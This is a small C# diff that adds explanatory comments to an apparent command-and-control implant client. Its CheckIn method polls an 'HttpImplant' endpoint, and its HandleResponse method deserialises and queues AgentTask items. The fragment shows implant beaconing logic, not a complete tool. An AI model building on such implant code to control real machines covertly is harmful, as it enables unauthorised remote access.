@@ -74,13 +74,14 @@ namespace AgentClient.Infrastructure.CommModules
             await Task.CompletedTask;
         }
 
-
+        // fetches data from server + processing
         private async Task CheckIn()
         {
             var response = await _client.GetByteArrayAsync("HttpImplant");
             HandleResponse(response);
         }
 
+        // deserialises responses and enqueues any resulting tasks
         private void HandleResponse(byte[] response)
         {
             var tasks = response.Deserialise<AgentTask[]>();
